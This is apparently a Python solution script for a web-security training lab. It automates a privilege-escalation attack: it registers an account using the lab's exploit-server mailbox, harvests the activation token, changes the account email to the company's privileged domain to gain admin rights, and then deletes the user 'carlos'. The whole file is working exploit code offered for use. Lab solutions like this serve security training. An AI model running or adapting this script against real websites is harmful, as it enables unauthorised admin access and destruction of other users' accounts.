import time
import requests
import re
import sys

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
register_url = burp_url + '/register'
login_url = burp_url + '/login'

session = requests.Session()

response = session.get(register_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

find_mail_server = re.search(r'https://exploit-[0-9a-fA-F]+\.exploit-server\.net', response.text)
mail_url = find_mail_server.group(0) + '/email'

mail = mail_url.replace("https://", "")
my_mail = 'attacker@' + mail[:-6]
burp_data = {"csrf": csrf, "username": "aaaa", "email": my_mail, "password": "1111"}
session.post(register_url, data=burp_data)
print(my_mail)
#time.sleep(2)

response = session.get(mail_url)
active_url_search = re.search(r'=([a-zA-Z0-9]{32})', response.text)
zmienna = active_url_search.group(0)
active_url = burp_url + '/register?temp-registration-token' + zmienna
session.get(active_url)
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "aaaa", "password": "1111"}
session.post(login_url, data=burp_data)
response = session.get(burp_url+ '/my-account?id=aaaa')
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"email": "x@dontwannacry.com", "csrf": csrf}
session.post(burp_url+ '/my-account/change-email', data=burp_data)
session.get(burp_url+ '/admin/delete?username=carlos')
